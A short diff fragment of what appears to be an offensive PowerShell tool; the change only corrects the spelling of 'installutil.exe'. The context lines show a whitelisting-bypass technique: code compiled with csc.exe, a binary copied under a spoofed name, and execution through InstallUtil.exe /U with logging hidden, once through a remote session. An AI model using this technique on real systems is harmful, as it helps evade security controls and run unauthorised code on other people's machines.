@@ -124,7 +124,7 @@ $command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Au
 Invoke-Expression -Command $command
 
 if($Spoof){
-$SpoofContent=Get-Content -Path "$realpath\instalutil.exe" -Encoding Byte
+$SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
 [System.IO.File]::WriteAllBytes("C:\$env:username\desktop\$Spoofname",$SpoofContent)
 $command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
@@ -187,7 +187,7 @@ $command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Au
 Invoke-Expression -Command $command
 
 if($Spoof){
-$SpoofContent=Get-Content -Path "$realpath\instalutil.exe" -Encoding Byte
+$SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
 [System.IO.File]::WriteAllBytes("C:\$env:username\desktop\$Spoofname",$SpoofContent)
 $command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
 Invoke-Expression -Command $command2
